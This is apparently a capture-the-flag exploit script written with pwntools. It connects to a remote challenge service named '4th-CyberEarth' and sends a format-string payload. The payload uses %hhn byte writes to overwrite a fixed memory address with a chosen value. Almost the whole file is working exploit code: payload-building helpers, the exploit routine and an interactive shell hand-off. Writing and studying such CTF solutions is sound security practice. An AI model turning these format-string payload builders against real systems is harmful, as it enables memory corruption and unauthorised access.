#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "4th-CyberEarth"
libFile  = ""


remoteIp = '111.198.29.45'
remotePort = 41210

LOCAL = 0
LIBC  = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

def fmt_str(offset, size, addr, target):
	payload = ""
	for i in range(4):
		if size == 4:
			payload += p32(addr + i)
		else:
			payload += p64(addr + i)
	prev = len(payload)
	for i in range(4):
		payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
		prev = (target >> i * 8) & 0xff
	return payload

#--------------------------Exploit--------------------------
def exploit():
	p = fmt_str(12, 4, 0x0804A048, 0x2223322)
	sl(p)

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIBC:
			libc = ELF(libFile)
		io = exe.process(env = {"LD_PRELOAD" : libFile})
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIBC:
			libc = ELF(libFile)
	
	exploit()
	finish()
    
